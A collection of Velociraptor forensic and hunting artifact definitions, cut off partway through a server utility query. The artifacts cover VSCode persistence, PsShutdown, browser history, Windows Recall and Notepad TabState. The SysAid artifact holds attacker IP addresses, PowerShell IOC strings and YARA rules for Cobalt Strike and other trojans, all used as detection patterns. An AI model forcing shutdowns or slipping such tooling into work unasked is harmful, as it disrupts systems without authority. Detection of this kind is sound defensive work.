name: Windows.Persistence.VscodeTasks
author: Matt Green - @mgreen27
description: |
   This artifact parses VSCode configuration files to find potenital 
   persistence.
   
   Terminal Profiles via settings.json  
   Visual Studio tasks via tasks.json  

   The artifact has configurable options to Include all tasks and settings for 
   visibility. 
   
   NOTE: experimental - additional research may include Visual Studio Code Extensions
   
reference:
    - https://twitter.com/nas_bench/status/1618021415852335105
    - https://twitter.com/nas_bench/status/1618021838407495681


type: CLIENT

parameters:
   - name: IncludeAllTasks
     type: bool
   - name: IncludeAllSettings
     type: bool

sources:
  - precondition:
      SELECT OS From info() where OS = 'windows'

    query: |
      SELECT
            OSPath,	
            FileSize,
            FileName,	
            parse_json(data=regex_replace(source=read_file(filename=OSPath) , re='''//.+\n''', replace='')) As Parsed,
            dict(
                Created0x10=Created0x10,	
                Created0x30=Created0x30,
                LastModified0x10=LastModified0x10,
                LastModified0x30=LastModified0x30,
                LastRecordChange0x10=LastRecordChange0x10,
                LastRecordChange0x30=LastRecordChange0x30,
                LastAccess0x10=LastAccess0x10,
                LastAccess0x30=LastAccess0x30
            ) as Timestamps
          FROM Artifact.Windows.NTFS.MFT(FileRegex='^(settings|tasks)\.json$',PathRegex='vscode')
          WHERE
            if(condition=IncludeAllTasks,
                then= FileName='tasks.json',
                else= Parsed.settings.`task.allowAutomaticTasks` = 'on' )
            OR if(condition=IncludeAllSettings,
                then= FileName='settings.json',
                else= Parsed.settings.`terminal.integrated.defaultprofile.windows` )

---END OF FILE---

======
FILE: /content/exchange/artifacts/Windows.Sysinternals.PSShutdown.yaml
======
name: Windows.Sysinternals.PSShutdown
description: |
   PsShutdown is a command-line utility similar to the shutdown utility from the Windows 2000 Resource Kit, but with the ability to do much more. In addition to supporting the same options for shutting down or rebooting the local or a remote computer, PsShutdown can logoff the console user or lock the console (locking requires Windows 2000 or higher). PsShutdown requires no manual installation of client software.
author: Ian Boje

# Can be CLIENT, CLIENT_EVENT, SERVER, SERVER_EVENT or NOTEBOOK
type: CLIENT

parameters:
   - name: Action
     default: Reboot
     type: choices
     choices:
        - Abort
        - Suspend
        - Hybernate
        - Poweroff
        - Lock
        - Logoff console user
        - Reboot
        - Shutdown without poweroff
        - Turn off monitor
   - name: time
     default: 30
     description: -t Can be either seconds, or 24 hour clock
   - name: abortable
     type: bool
     description: -c Allows user to cancel shutdown 
     default: Y
   - name: force
     type: bool
     description: -f Forces all running applications to exit during the shutdown instead of giving them a chance to gracefully save their data.
   - name: message
     description: -m This option lets you specify a message to display to logged-on users when a shutdown countdown commences.
   - name: msgtime
     description: -v Display message for the specified number of seconds before the shutdown.  If set to 0, no dialog will be displayed.

tools:
    - name: PSShutdown64
      url: https://live.sysinternals.com/tools/psshutdown64.exe
      serve_locally: true
     
sources:
  - precondition:
      SELECT OS From info() where OS = 'windows'

    query: |
        LET PSShutdown64bin <= select * from Artifact.Generic.Utils.FetchBinary(ToolName="PSShutdown64")
        
        LET ActionArg <= "-r" -- Default if nothing matches
        LET ActionArg <= if(condition=Action="Suspend", then="-d", else=ActionArg)
        LET ActionArg <= if(condition=Action="Hybernate", then="-h", else=ActionArg)
        LET ActionArg <= if(condition=Action="Poweroff", then="-k", else=ActionArg)
        LET ActionArg <= if(condition=Action="Logoff console user", then="-o", else=ActionArg)
        LET ActionArg <= if(condition=Action="Reboot", then="-r", else=ActionArg)
        LET ActionArg <= if(condition=Action="Shutdown without poweroff", then="-s", else=ActionArg)
        
        
        LET args <= (
            PSShutdown64bin[0].OSPath,
            "-accepteula",
            ActionArg,
            "-t",
            time,
            if(condition=message, then="-m", else=""),
            if(condition=message, then=message, else=""),
            if(condition=abortable, then="-c", else=""),
            if(condition=force, then="-f", else=""),
            if(condition=msgtime, then="-v", else=""),
            if(condition=msgtime, then=msgtime, else="")
        )
        
        -- abort -a deletes all other switches
        LET args <= if(condition=Action="Abort", then=(PSShutdown64bin[0].OSPath, "-a"), else=args)
        -- so does lock -l
        LET args <= if(condition=Action="Lock", then=(PSShutdown64bin[0].OSPath, "-l"), else=args)
        -- monitor shutdown too 
        LET args <= if(condition=Action="Turn off monitor", then=(PSShutdown64bin[0].OSPath, "-x"), else=args)
        
        LET args <= filter(list=args, regex=".+")
        
        SELECT *, args as command FROM execve(argv=args)
        

---END OF FILE---

======
FILE: /content/exchange/artifacts/MacOS.ParallelsVM.SuspendedMemory.yaml
======
name: MacOS.ParallelsVM.SuspendedMemory
description: |
   Looks for suspended Parallels VM owned by any user on a MacOS system. Can automatically upload the virtual memory files if found.
   
   If a "*.mem.sh" file exists, that VM is running and not suspended.
   
   **NOTE:** Uploading the Parallels memory file can take a while due to the size.

type: CLIENT

author: Brady Semm - @btsemm

precondition: SELECT OS From info() where OS = 'darwin'

parameters:
  - name: ParallelsMemoryPath
    default: "/Users/*/Parallels/*.pvm/{*.mem,*.mem.sh}"
  - name: UploadFiles
    type: bool

sources:
  - name: ParallelsMemoryFiles
    query: |
      LET ParallelsMemoryFiles <= SELECT parse_string_with_regex(regex="/Users/(?P<User>[^/]+)", string=FullPath).User AS User,
          parse_string_with_regex(regex="/Users/[^/]+/Parallels/(?P<VMName>[^\.]+).pvm", string=FullPath).VMName AS VMName,
          FullPath, File, Mtime, Size
          FROM glob(globs=ParallelsMemoryPath)
          
      SELECT User, VMName, Mtime, Size, FullPath
      FROM ParallelsMemoryFiles
      
  - name: Uploads
    query: |
      SELECT * FROM if(condition=UploadFiles,
        then={
            SELECT FullPath, User, VMName, Mtime,
               upload(file=FullPath) as FileDetails
            FROM ParallelsMemoryFiles
            WHERE FullPath =~ ".*\.mem$"
        })

---END OF FILE---

======
FILE: /content/exchange/artifacts/SysAid.yaml
======
name: Windows.Detection.SysAid
author: Matt Green - @mgreen27
description: |
   Detects artifacts associated with post exploitation activity of 
   LaceTempest related to the SysAid 0day.
   
   There are several sub artifact scopes, with configurable regex parameters to 
   target.
   
   - Yara.Process: Targets observed malware and cobalt strike via process yara
   - Disk.Ntfs: targets known disk IOCs via Windows.ntfs.mft
   - Forensic.Usn: targets known disk IOCs via USN journal
   - Evtx.Defender: Searches Defender event logs for evidence of associated alerts
   - Evtx.NetworkIOC: targets known strings of network IOCs in Firewall, Sysmon logs.
   - Evtx.PowershellIOC: targets known strings of powershell IOCs in Powershell logs.
   
type: CLIENT
resources:
  timeout: 1800
  
parameters:
  - name: FileNameRegex
    description: FileName disk IOC regex
    type: regex
    default: ^(usersfiles\.war|user\.exe|leave)$
  - name: PathRegex
    description: Path disk IOC regex
    type: regex
    default: \\Program Files\\SysAidServer\\tomcat\\webapps\\
  - name: AllDrives
    type: bool
    description: target all drives.
  - name: DefenderDetection
    description: Regex of Defender strings to hunt in Defender evtx
    type: regex
    default: Win32/Clop|Win32/TurtleLoader
  - name: NetworkIoc
    description: Regex of network IOCs to hunt evtx
    default: 81\.19\.138\.52|45\.182\.189\.100|179\.60\.150\.34|45\.155\.37\.105
  - name: PowershellIoc
    description: Regex of Powershell string IOCs to hunt evtx
    default: STOP-PROCs FOUND\! Exiting|userentry\|getLogo\\\.jsp\|Go|179\.60\.150\.34
  - name: UploadYaraHits
    type: bool
  - name: YaraRule
    type: yara
    default: |
        rule Windows_Trojan_HazelCobra_6a9fe48a {
            meta:
                author = "Elastic Security"
                id = "6a9fe48a-6fd9-4bce-ac43-254c02d6b3a4"
                fingerprint = "4dc883be5fb6aae0dac0ec5d64baf24f0f3aaded6d759ec7dccb1a2ae641ae7b"
                creation_date = "2023-11-01"
                last_modified = "2023-11-01"
                threat_name = "Windows.Trojan.HazelCobra"
                reference_sample = "b5acf14cdac40be590318dee95425d0746e85b1b7b1cbd14da66f21f2522bf4d"
                severity = 100
                arch_context = "x86"
                scan_context = "file, memory"
                license = "Elastic License v2"
                os = "windows"
            strings:
                $a1 = { 83 E9 37 48 63 C2 F6 C2 01 75 0C C0 E1 04 48 D1 F8 88 4C 04 40 EB 07 }
                $s1 = "Data file loaded. Running..." fullword
                $s2 = "No key in args" fullword
                $s3 = "Can't read data file" fullword
            condition:
                $a1 or all of ($s*)
        }
        rule Windows_Trojan_FlawedGrace_8c5eb04b {
            meta:
                author = "Elastic Security"
                id = "8c5eb04b-301b-4d05-a010-3329e5b764c6"
                fingerprint = "46ce025974792cdefe9d4f4493cee477c0eaf641564cd44becd687c27d9e7c30"
                creation_date = "2023-11-01"
                last_modified = "2023-11-02"
                threat_name = "Windows.Trojan.FlawedGrace"
                reference_sample = "966112f3143d751a95c000a990709572ac8b49b23c0e57b2691955d6fda1016e"
                severity = 100
                arch_context = "x86"
                scan_context = "file, memory"
                license = "Elastic License v2"
                os = "windows"
            strings:
                $a1 = "Grace finalized, no more library calls allowed." ascii fullword
                $a2 = ".?AVReadThread@TunnelIO@NS@@" ascii fullword
                $a3 = ".?AVTunnelClientDirectIO@NS@@" ascii fullword
                $a4 = ".?AVWireClientConnectionThread@NS@@" ascii fullword
                $a5 = ".?AVWireParam@NS@@" ascii fullword
            condition:
                3 of them
        }
        rule win_cobalt_strike_auto {
            meta:
                author = "Felix Bilstein - yara-signator at cocacoding dot com"
                date = "2023-07-11"
                description = "Detects win.cobalt_strike."
                malpedia_reference = "https://malpedia.caad.fkie.fraunhofer.de/details/win.cobalt_strike"
                malpedia_license = "CC BY-SA 4.0"
                malpedia_sharing = "TLP:WHITE"
            strings:
                $sequence_0 = { e9???????? eb0a b801000000 e9???????? }
                $sequence_1 = { 3bc7 750d ff15???????? 3d33270000 }
                $sequence_2 = { ff15???????? 03c6 59 8bf0 }
                $sequence_3 = { ff05???????? 891e 8937 894f08 894604 c7470408000000 5b }
                $sequence_4 = { ff15???????? 03f8 03f0 83f8ff 740b 3b750c 7ce0 }
                $sequence_5 = { eb0b 8b45d4 83c010 8945d4 eb84 e9???????? 837d0c18 }
                $sequence_6 = { ff13 83c40c 3bc7 7545 }
                $sequence_7 = { eb0c 890d???????? e8???????? 59 5f 5e 5d }
                $sequence_8 = { 85c0 741d ff15???????? 85c0 7513 }
                $sequence_9 = { e8???????? e9???????? 833d????????01 7505 e8???????? }
                $sequence_10 = { 8bd0 e8???????? 85c0 7e0e }
                $sequence_11 = { 85c0 7405 e8???????? 8b0d???????? 85c9 }
                $sequence_12 = { e8???????? 488d4c2420 41b800200000 488bd3 e8???????? 4533c0 488bd3 }
                $sequence_13 = { c1e810 25ff000000 b901000000 486bc901 488b542448 88040a 8b0424 }
                $sequence_14 = { 83f835 741d ff15???????? 413bc6 7312 b9e8030000 ff15???????? }
                $sequence_15 = { 7514 488b4f20 ff15???????? 488b4f20 ff15???????? 488b7f30 4885ff }

            condition:
                7 of them
        }
     
reference:
    - https://profero.io/posts/sysaidonpremvulnerability/
    - https://www.sysaid.com/blog/service-desk/on-premise-software-security-vulnerability-notification

precondition: SELECT OS From info() where OS = 'windows'

sources:
  - name: Yara.Process
    query: |
      SELECT * FROM Artifact.Windows.Detection.Yara.Process(
                                YaraRule=YaraRule,
                                UploadHits=UploadYaraHits )
  - name: Disk.Ntfs
    query: |
      SELECT * FROM Artifact.Windows.NTFS.MFT(  AllDrives=AllDrives,
                                                FileRegex=FileNameRegex,
                                                PathRegex=PathRegex )
  - name: Forensic.Usn
    query: |
      SELECT * FROM Artifact.Windows.Forensics.Usn( AllDrives=AllDrives,
                                                    FileNameRegex=FileNameRegex,
                                                    PathRegex=PathRegex )
  - name: Evtx.Defender
    query: |
      SELECT * FROM Artifact.Windows.EventLogs.EvtxHunter(
                EvtxGlob='%SystemRoot%\\System32\\Winevt\\Logs\\*Defender*.evtx',
                IocRegex= DefenderDetection )
                
  - name: Evtx.NetworkIOC
    query: |
      SELECT * FROM Artifact.Windows.EventLogs.EvtxHunter(
                EvtxGlob='%SystemRoot%\\System32\\Winevt\\Logs\\*{Firewall,Sysmon}*.evtx',
                IocRegex= NetworkIoc )

  - name: Evtx.Powershell
    query: |
      SELECT * FROM Artifact.Windows.EventLogs.EvtxHunter(
                EvtxGlob='%SystemRoot%\\System32\\Winevt\\Logs\\*Powershell*.evtx',
                IocRegex= PowershellIoc )
                
                
column_types:
  - name: HitContext
    type: preview_upload

---END OF FILE---

======
FILE: /content/exchange/artifacts/IPCheck.Virustotal.yaml
======
name: IPCheck.Virustotal
author: Adrian Lopez Moreno @AdrianX21
description: |
  Submit a IP to Virustotal. Default Public API restriction is 4 requests/min (Inspired on Virustotal file Check created by Wes Lambert -- @therealwlambert).

  This artifact can be called from within another artifact 

  Ex.

    `SELECT * from Artifact.IPCheck.Virustotal(DestIP=$IP)`

     EX 2
     
     Check ip into a netstat: 
     Call the artifact -> Windows.Network.NetstatEnriched
     
      `SELECT * FROM source() WHERE DestIP != "127.0.0.1" AND Pid = 14604  (malicious connection)`
      VT Notebook analysis.
      
      `LET VTKey <= "Your key"`
      `Let Results = SELECT * from source() WHERE DestIP != "127.0.0.1" AND DestIP`
      `GROUP BY DestIP`
      `SELECT *, {SELECT VTRating FROM Artifact.IPCheck.Virustotal(VirustotalKey=VTKey, ip=DestIP) } AS VTResults FROM foreach(row=Results)`
      `ORDER BY VTResults DESC`

type: SERVER

parameters:
    - name: ip
      type: string
      description: IP to check on Virustotal.
      default:

    - name: VirustotalKey
      type: string
      description: API key for Virustotal.
      default:

sources:
  - query: |
        LET Creds = if(
           condition=VirustotalKey,
           then=VirustotalKey,
           else=server_metadata().VirustotalKey)

        LET URL <= 'https://www.virustotal.com/api/v3/ip_addresses/' + ip

        LET Data = SELECT parse_json(data=Content) AS VTData
        FROM http_client(url=URL, headers=dict(`x-apikey`=Creds))

        SELECT format(format='%v/%v',
             args=[VTData.data.attributes.last_analysis_stats.malicious,
                   VTData.data.attributes.last_analysis_stats.malicious +
                   VTData.data.attributes.last_analysis_stats.undetected]) As VTRating,
            timestamp(epoch=VTData.data.attributes.first_seen_itw_date) AS FirstSeen,
            timestamp(epoch=VTData.data.attributes.first_submission_date) AS FirstSubmitted,
            timestamp(epoch=VTData.data.attributes.last_analysis_date) AS LastAnalysis,
            VTData.data.attributes.crowdsourced_yara_results AS YARAResults,
            VTData AS _Data
        FROM Data

---END OF FILE---

======
FILE: /content/exchange/artifacts/Windows.Forensics.PersistenceSniper.yaml
======
name: Windows.Forensics.PersistenceSniper
description: |
  PersistenceSniper is a Powershell module that can be used by Blue Teams, Incident
  Responders and System Administrators to hunt persistences implanted in Windows machines.
  It is also available on Powershell Gallery and it is digitally signed with a valid code
  signing certificate. The tool is under active development with new releases coming out
  regularly, so make sure to use the up-to-date version.
  https://github.com/last-byte/PersistenceSniper

  NOTE: the Rapid7 team has observed this artifact fail with some EDR/EPP tools deployed
  with Powershell prevention capabilities. Please ensure the Velociraptor binary (and
  child powershell) are excluded in these tools.
  Now DiffCSVUrl is downloaded during generation of the 
  collector, not during execution.

author: Chris Jones - CPIRT | FabFaeb | Antonio Blescia (TheThMando) | 0xdeadcell

parameters:
  - name: IncludeHighFalsePositivesChecks
    default: true
    type: bool
  - name: UploadHits
    type: bool
    default: false

tools:
  - name: PSniper
    url: https://github.com/last-byte/PersistenceSniper/releases/download/v1.16.1/PersistenceSniper.zip
  - name: DiffCSVUrl
    url: https://raw.githubusercontent.com/ablescia/Windows.PersistenceSniper/main/false_positives.csv


type: Client

precondition: SELECT OS From info() where OS = 'windows'

sources:
  - query: |
       LET TmpDir <= tempdir(remove_last='Y')

       LET Toolzip <= SELECT FullPath
         FROM Artifact.Generic.Utils.FetchBinary(ToolName="PSniper",
                                                 IsExecutable=FALSE)
       
       LET CSVPath <= SELECT FullPath
         FROM Artifact.Generic.Utils.FetchBinary(ToolName="DiffCSVUrl",
                                                 IsExecutable=FALSE)

       LET _ <= SELECT *
         FROM unzip(filename=Toolzip.FullPath, output_directory=TmpDir)

       LET PSniperLocation = path_join(
           components=[TmpDir, 'PersistenceSniper', 'PersistenceSniper.psm1'],
           path_type='windows')

       LET FalsePositivesFile <= path_join(
           components=[TmpDir, '\\false_positives.csv'],
           path_type='windows')

       LET CSVFile <= path_join(
           components=[TmpDir + '\\psniper_results.csv'],
           path_type='windows')
       LET csvpath = '"' + CSVFile.Path + '"'

       LET arg_diffcsv <= if(
           condition=CSVFile != "",
           then="-DiffCSV " + '"' + FalsePositivesFile.Path + '"',
           else="")

       LET arg_includehighfalsepositiveschecks <= if(
           condition=IncludeHighFalsePositivesChecks,
           then="-IncludeHighFalsePositivesChecks",
           else="")

       LET cmdline <= join(
           array=['import-module', '"' + PSniperLocation.Path + '";', 'Find-AllPersistence', arg_includehighfalsepositiveschecks, arg_diffcsv, '| ConvertTo-CSV -NoTypeInformation | Out-File -encoding ASCII',csvpath],
           sep=' ')

       LET _ <= SELECT *
         FROM execve(
           argv=["powershell", "-ExecutionPolicy", "bypass", "-command", cmdline])

       LET hits = SELECT *
         FROM parse_csv(filename=CSVFile)

       -- upload files if selected
       LET upload_hits = SELECT *, upload(file=CSVFile) AS Upload
                         FROM hits

       -- return rows
       SELECT *
       FROM if(
         condition=UploadHits,
         then=upload_hits,
         else=hits)

---END OF FILE---

======
FILE: /content/exchange/artifacts/Apache.AccessLogs.yaml
======
name: Generic.Apache.AccessLogs

description: |
  Parses Apache access logs to extract detailed request information.

author: Harsh Jaroli, Krishna Patel

reference:
  - https://httpd.apache.org/docs/2.4/logs.html

type: CLIENT

parameters:
  - name: AccessLogPath
    default: /{/var/log/httpd,/var/log/apache2,/var/log/nginx,C:/Apache/logs}/{access.log,access_log}*

  - name: ApacheAccessLogGrok
    description: A Grok expression for parsing Apache access log lines.
    default: >-
      %{IPORHOST:client} - - \[%{HTTPDATE:timestamp}\] "%{WORD:method} %{URIPATHPARAM:request} HTTP/%{NUMBER:httpversion}" %{NUMBER:status} %{NUMBER:response_size}

sources:
  - query: |
      // Basic Apache access log parsing via GROK expressions.
      SELECT timestamp(string=Event.timestamp) AS Time,
             Event.client AS ClientIP,
             Event.method AS RequestMethod,
             Event.request AS RequestURL,
             Event.httpversion AS HTTPVersion,
             Event.status AS ResponseStatus,
             Event.response_size AS ResponseSize,
             OSPath
        FROM foreach(
          row={
              SELECT OSPath FROM glob(globs=AccessLogPath)
          }, query={
              SELECT grok(grok=ApacheAccessLogGrok, data=Line) AS Event, OSPath
              FROM parse_lines(filename=OSPath)
          })

---END OF FILE---

======
FILE: /content/exchange/artifacts/Windows.Office.MRU.yaml
======
name: Windows.Office.MRU
author: "Yaron King - @Sam0rai"
description: |
   This artifact enables hunting for recently used Office Documents.

   The artifact takes a Registry path, and extracts the Most Recently Used (= MRU) files list from Microsoft Office products (i.e.: Word, Excel, Powerpoint).

type: CLIENT

precondition:
  SELECT * FROM info() where OS = 'windows'

parameters:
  - name: OfficeMRU_RegistryGlob
    description: Registry path glob for Microsoft Office's MRU list.
    default: HKEY_USERS\S-1-5-21-*\Software\Microsoft\Office\1{4,5,6}.0\{Word,Excel,PowerPoint}\User MRU\*\File MRU\Item*

sources:
  - query: |
        Let OfficeMRU_RegistryGlob = '''HKEY_USERS\S-1-5-21-*\Software\Microsoft\Office\1{4,5,6}.0\{Word,Excel,PowerPoint}\User MRU\*\File MRU\Item*'''

        SELECT
            timestamp(winfiletime=int(int="0x" + parse_string_with_regex(string=Data.value, regex=['\\[T(?P<timestamp>\\w\+)']).timestamp)) as Timestamp,
            lookupSID(sid=(split(string=FullPath, sep='\\\\'))[2]) as SAMaccountname,
            (split(string=FullPath, sep='\\\\'))[7] as FileType, (split(string=Data.value, sep='\\*'))[1] as Path
        FROM
            glob(globs=OfficeMRU_RegistryGlob, accessor='reg')

---END OF FILE---

======
FILE: /content/exchange/artifacts/MacOS.Applications.Firefox.History.yaml
======
name: MacOS.Applications.Firefox.History
description: |
  Read all Users Firefox history.

parameters:
  - name: historyGlobs
    default: /Users/*/Library/Application Support/Firefox/Profiles/*/places.sqlite
  - name: urlSQLQuery
    default: |
        SELECT datetime(moz_historyvisits.visit_date/1000000,'unixepoch') AS visit_time, moz_places.url as visited_url,title, visit_count,
             typed, frecency, last_visit_date, description, rev_host, preview_image_url FROM moz_places, moz_historyvisits WHERE moz_places.id = moz_historyvisits.place_id
  - name: userRegex
    default: .

reference:
  - https://www.foxtonforensics.com/browser-history-examiner/firefox-history-location
  - https://en.wikiversity.org/wiki/Firefox/Browsing_history_database
  
author: https://github.com/x64-julian

precondition: SELECT OS From info() where OS = 'darwin'

sources:
  - query: |
      LET history_files = SELECT
         parse_string_with_regex(regex="/Users/(?P<User>[^/]+)", string=OSPath).User AS User,
         OSPath
      FROM glob(globs=historyGlobs)

      SELECT * FROM foreach(row=history_files,
        query={
           SELECT User, OSPath,
              visit_time, visited_url, title,description,  visit_count, typed, frecency,
              last_visit_date, rev_host, preview_image_url
          FROM sqlite(
             file=OSPath,
             query=urlSQLQuery)
          })

---END OF FILE---

======
FILE: /content/exchange/artifacts/Windows.System.Recall.AllWindowEvents.yaml
======
name: Windows.System.Recall.AllWindowEvents
author: |
  Zach Stanford @svch0st
description: |
   This artefact will read and correlate several tables to do with Microsoft Recall.
   
   The main database is held here:
      C:\Users\\*\AppData\Local\CoreAIPlatform.00\UKP\{DA73A0DB-DDF4-4A81-9506-CCB5DE8B0F14}\ukg.db
        
   This artefact will join multiple tables together to enrich the Window Capture events of recall. 

  
parameters:
  - name: ukgPath
    default: /AppData/Local/CoreAIPlatform.00/UKP/*/ukg.db
  - name: SQLiteQuery
    default: |
        SELECT WindowCapture.TimeStamp, WindowCapture.Name as EventName, WindowCapture.WindowTitle as WindowTitle, App.Name as AppName, App.Path as AppProcess FROM WindowCapture LEFT JOIN (SELECT  WindowId as wid, AppId FROM WindowCapture LEFT JOIN WindowCaptureAppRelation ON Id=WindowCaptureId WHERE WindowId is not NULL and AppId is not NULL GROUP BY WindowId, AppId ORDER BY WindowId) WindowApp ON WindowCapture.WindowId=WindowApp.wid LEFT JOIN App ON App.Id=WindowApp.AppId ORDER BY TimeStamp
  - name: userRegex
    default: .
    type: regex

precondition: SELECT OS From info() where OS = 'windows'

sources:
  - query: |
        LET db_files = SELECT * from foreach(
          row={
             SELECT Uid, Name AS User, Directory+ukgPath as globPath,
                    expand(path=Directory) AS HomeDirectory
             FROM Artifact.Windows.Sys.Users()
             WHERE Name =~ userRegex
          },
          query={
             SELECT User, OSPath, Mtime, HomeDirectory
             FROM glob(globs=globPath)
          })

        SELECT timestamp(epoch=TimeStamp) as Timestamp,
               EventName,
               WindowTitle,
               AppName,
               AppProcess
        FROM foreach(row=db_files,
          query={
            SELECT *,OSPath
            FROM sqlite(
              file=OSPath,
              query=SQLiteQuery)
          })


---END OF FILE---

======
FILE: /content/exchange/artifacts/Windows.Sys.LoggedInUsers.yaml
======
name: Windows.Sys.LoggedInUsers
author: Zane Gittins
description: |
   Get all currently logged in users via wmi.

# Can be CLIENT, CLIENT_EVENT, SERVER, SERVER_EVENT
type: CLIENT

parameters:
   - name: UserNameRegex
     default: .
     type: string
     description: Filter by username.
   - name: DomainRegex
     default: .
     type: string
     description: Filter by domain.
   - name: LogonTypeRegex
     default: .
     type: string
     description: Filter by logon type. For example, 10 for remote.

sources:
  - precondition:
      SELECT OS From info() where OS = 'windows'

    query: |
     // Helper functions
     LET _X(X) = parse_string_with_regex(regex="(^.+)(-\\d+)$", string=X)
     LET NormalizeTime(X) = format(
         format="%s%03g00",
         args=[_X(X=X).g1, int(int=_X(X=X).g2) / 60])
     LET ParseTime(X) = timestamp(
         string=NormalizeTime(X=X),
         format="20060102150405.999999-0700")
     LET ExtractDomain(X) = parse_string_with_regex(
         string=X,
         regex=['Domain=\\"(.*?)\\"']).g1
     LET ExtractLogonName(X) = parse_string_with_regex(
         string=X,
         regex=['Name=\\"(.*)\\"']).g1
     LET ExtractLogonID(X) = parse_string_with_regex(
         string=X,
         regex=['LogonId=\\"([0-9]+)\\"']).g1
     LET FormatTime(Time) = timestamp(
         string=regex_replace(source=Time, replace="-0", re="-"),
         format=TimeFormat)
     LET CurrentlyLoggedIn <= SELECT ExtractDomain(X=Antecedent) AS Domain,
                                     ExtractLogonName(X=Antecedent) AS LogonName,
                                     ExtractLogonID(X=Dependent) AS CurrentLogonId
       FROM wmi(query="SELECT * FROM win32_loggedonuser", namespace="ROOT/CIMV2")
       WHERE LogonName =~ UserNameRegex
     // WMI Queries
     LET Sessions <= SELECT *
       FROM wmi(query="SELECT * FROM Win32_LogonSession", namespace="ROOT/CIMV2")
     LET Processes <= SELECT 
                             ExtractLogonID(X=Antecedent) AS LogonID,
                             count() AS ProcessCount
       FROM wmi(query="SELECT * from Win32_SessionProcess", namespace="ROOT/CIMV2")
       GROUP BY LogonID
     LET CurrentSessions = SELECT *, {
                                    SELECT *
                                    FROM CurrentlyLoggedIn
                                    WHERE LogonID = CurrentLogonId
                                     AND Domain =~ DomainRegex
                                          AND LogonType =~ LogonTypeRegex
                                  } AS LoginInfo,
                                  {
                                    SELECT *
                                    FROM Sessions
                                    WHERE LogonID = LogonId
                                  } AS SessionInfo
       FROM Processes
     // Final query 
     SELECT 
            ParseTime(X=SessionInfo.StartTime) AS Timestamp,
            LoginInfo.LogonName AS LogonName,
            LoginInfo.Domain AS Domain,
            ProcessCount,
            SessionInfo.LogonType AS LogonType,
            SessionInfo.LogonId AS LogonID,
            SessionInfo.AuthenticationPackage AS AuthenticationPackage
     FROM CurrentSessions
     WHERE LogonName =~ UserNameRegex
      AND Domain =~ DomainRegex
           AND LogonType =~ LogonTypeRegex
     ORDER BY Timestamp DESC

---END OF FILE---

======
FILE: /content/exchange/artifacts/linux.kunai.yaml
======
name: Exchange.Linux.Kunai
author: Wes Lambert -- @therealwlambert, @weslambert@infosec.exchange
description: |
   Kunai is a Linux-based security monitoring and threat hunting tool written in Rust.  This artifact parses the Kunai log file. 
reference:
  - https://github.com/0xrawsec/kunai 
parameters:
   - name: LogFile
     default: kunai.log
     description: Path of Kunai log file

sources:
  - precondition:
      SELECT OS From info() where OS = 'linux'

    query: |
      SELECT
        info.utc_time AS Timestamp,
        info.host.hostname AS Hostname,
        info.host.container AS _Container,
        info.event.id AS EventID,
        info.event.name AS EventName,
        info.event.uuid AS EventUUID,
        data.command_line AS CommandLine,
        data.exe AS Exe,
        data.path AS Path,
        info.event.batch AS _EventBatch,
        info.task AS Task,
        info.parent_task AS ParentTask
      FROM parse_jsonl(filename=LogFile)

---END OF FILE---

======
FILE: /content/exchange/artifacts/TabState.yaml
======
name: Windows.Forensics.TabState
author: Matt Green - @mgreen27
description: |
   This artifact parses notepad TabState files in available in Windows 11.
   
   In Windows 11, notepad has implemented a feature to repopulate previously 
   open notepad tabs - both saved and unsaved. This data is stored on disk and 
   provides an interesting opportunity for DFIR practitioners.
   
reference:
  - https://medium.com/@mahmoudsoheem/new-digital-forensics-artifact-from-windows-notepad-527645906b7b
  - https://www.youtube.com/watch?v=zSSBbv2fc2s
  
type: CLIENT

parameters:
   - name: TargetGlob
     description: Target glob for notepad TabState bin files.
     default: C:\Users\*\AppData\Local\Packages\Microsoft.WindowsNotepad_8wekyb3d8bbwe\LocalState\TabState\*.bin
   - name: ContentRegex
     description: Content filter regex to select which TabState files return a row.
     type: regex
     default: .
   - name: FilenameRegex
     description: Filter regex to select Saved filename path. ```^$``` returns only unsaved files.
     type: regex
     default: .
   - name: UploadFile
     description: If selected will upload TabState file.
     type: bool

export: |
    LET TSProfile = '''[
        ["TabState", 0, [
            ["__Magic", 0, "String", {"length": 3, "term_hex" : "FFFFFF" }],
            ["__Saved", 3, "char"],
            ["__FileNameSize", 4, "int8"],
            ["__Filename", 5, "String", {
                                        encoding: "utf8",
                                        length: "x=>x.__FileNameSize * 2", 
                                        term_hex : "000000",
                                    }],
            ["Filename",0,"Value",{"value": "x=>if(condition= x.__Saved > 0, then=utf16(string=x.__Filename),else='')"}],
            
            ["__HeaderPrefix", "x=>5 + len(list=x.__Filename)", "String",{"term_hex": "0100", length: 1000, max_length: 1000}],
            ["__DataOffset",0,"Value",{ "value": "x=>5 + len(list=x.__Filename) + len(list=x.__HeaderPrefix)"}],
            ["__Data", "x=> x.__DataOffset + 5", "String", {
                                        encoding: "utf8",
                                        length: 100000,
                                        max_length: 100000, 
                                        "term_hex" : "000000000000000000000000" 
                                    }],
            ["StateData",0,"Value",{ "value": "x=>utf16(string=x.__Data[:(len(list=x.__Data) - 5)])"}],
        ]]]'''


sources:
  - precondition:
      SELECT OS From info() where OS = 'windows'

    query: |
      LET results = SELECT OSPath, Name,Mtime,Atime,Ctime,Btime,
            parse_binary(filename=OSPath,profile=TSProfile,struct='TabState') as Parsed
        FROM glob(globs=expand(path=TargetGlob)) 
        WHERE NOT IsDir 
            AND NOT OSPath =~'''\.(0|1)\.bin$'''
            AND Parsed.StateData =~ ContentRegex
            AND Parsed.Filename =~ FilenameRegex
        
      SELECT 
        Name,Mtime,Atime,Ctime,Btime,
        Parsed.Filename as SavedFilename,
        Parsed.StateData as StateData,
        OSPath
      FROM if(condition= UploadFile,
        then={ 
            SELECT *, upload(file=OSPath) as Upload 
            FROM results 
        },
        else= results )


---END OF FILE---

======
FILE: /content/exchange/artifacts/Server.Utils.OrphanedFlows.yaml
======
name: Server.Utils.OrphanedFlows
description: |
  Sometimes flows are deleted but there is still outstanding data for
  them in flight. The server will continue to save this data after the
  flow is deleted.

  This happens when a hunt is deleted (thereby deleting all its flows)
  but there are in flight collections still outstanding.

type: SERVER

sources:
- query: |
     -- Calculate the space taken by each file (Does not count directories)
     LET _Du(OSPath, Accessor) =
       SELECT sum(item=Size) AS Sum
       FROM glob(globs="/**", root=OSPath, accessor=Accessor)
       GROUP BY 1
     LET Du(OSPath, Accessor) = _Du(OSPath=OSPath, Accessor=Accessor)[0].Sum

     -- Get all collection directories (that contain uploads, monitoring etc).
     LET FlowDirs =
         SELECT OSPath,
            OSPath[-1] AS FlowID, OSPath[-3] AS ClientId
